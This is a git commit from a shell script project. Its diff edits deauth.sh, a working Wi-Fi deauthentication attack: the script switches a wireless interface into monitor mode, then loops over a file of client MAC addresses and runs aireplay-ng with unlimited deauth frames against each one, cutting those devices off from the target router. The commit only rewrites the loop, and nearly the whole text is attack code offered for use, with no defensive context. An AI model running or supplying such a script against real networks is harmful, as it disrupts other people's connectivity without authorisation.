f2f65796802aaa09261ac516bc1be27c0c1ec1f4
stormzy22 <aawweb23@gmail.com>
2022-03-07 04:04:27 +0100

    removed for && added while

--- deauth.sh
+++ deauth.sh
@@ -2,7 +2,7 @@
 
 router_mac=$(sudo cat _gateway/BSSID.txt)
 interface=$(sudo cat _gateway/IF.txt)
-mac_to_deauth=$(sudo cat store/txt/file.txt)
+macs="store/txt/file.txt"
 
 sudo ifconfig "$interface" down
 sudo airmon-ng check kill
@@ -10,10 +10,12 @@ sudo iwconfig "$interface" mode monitor
 sudo ifconfig "$interface" up
 sudo airodump-ng "$interface" 
 sudo bash deauth_2.sh
-for val in $mac_to_deauth
+
+while read -r val
 do
 sudo aireplay-ng --deauth 0 -a "$router_mac" -c "$val" "$interface"&
-done
+done < $macs
+
 sudo ifconfig "$interface" down
 sudo iwconfig "$interface" mode managed
 sudo service NetworkManager restart
